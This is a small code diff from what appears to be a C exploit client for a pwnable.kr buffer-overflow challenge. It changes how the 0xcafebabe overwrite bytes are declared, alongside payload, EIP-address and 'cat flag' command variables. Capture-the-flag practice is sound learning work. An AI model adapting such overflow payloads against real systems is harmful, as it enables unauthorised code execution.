@@ -88,7 +88,7 @@ int main()
 		s32 *payload = NULL;
 		s32 *aBuffer = NULL;
 		s32 *eipAddress = NULL;
-		s32 theBeef[5] = { 0xbe,0xba,0xfe,0xca};  // = "\xbe\xba\xfe\xca";
+		s32 *theBeef  = "\xbe\xba\xfe\xca";
 		s32 *command = S32("cat flag\n");
 
 		printf("Connected to pwnable.kr\n");
